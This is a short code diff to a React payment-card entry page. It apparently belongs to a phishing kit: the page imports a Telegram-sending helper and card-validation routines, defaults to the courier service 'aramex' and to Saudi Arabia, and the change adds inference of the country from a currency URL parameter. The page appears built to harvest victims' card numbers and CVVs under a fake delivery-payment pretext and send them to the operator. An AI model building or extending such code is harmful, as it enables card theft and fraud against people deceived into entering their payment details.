@@ -25,7 +25,7 @@ import { sendToTelegram } from "@/lib/telegram";
 import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validateCVV } from "@/lib/cardValidation";
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
-import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import { getCurrencySymbol, formatCurrency, getCountryByCurrency } from "@/lib/countryCurrencies";
 
 const PaymentCardInput = () => {
   const { id } = useParams();
@@ -46,10 +46,14 @@ const PaymentCardInput = () => {
   const serviceParam = searchParams.get('service') || searchParams.get('s');
   const amountParam = searchParams.get('amount') || searchParams.get('a');
   const countryParam = searchParams.get('country') || searchParams.get('c');
+  const currencyParam = searchParams.get('currency');
   const bankParam = searchParams.get('bank') || searchParams.get('b');
 
+  // استنتاج الدولة من العملة إذا لم تكن موجودة
+  const inferredCountryFromCurrency = currencyParam ? getCountryByCurrency(currencyParam) : null;
+
   const customerInfo = linkData?.payload?.customerInfo || {};
-  const selectedCountry = countryParam || linkData?.payload?.selectedCountry || "SA";
+  const selectedCountry = countryParam || inferredCountryFromCurrency || linkData?.payload?.selectedCountry || "SA";
   const selectedBankId = bankParam || linkData?.payload?.selectedBank || '';
 
   const serviceKey = serviceParam || linkData?.payload?.service_key || customerInfo.service || 'aramex';
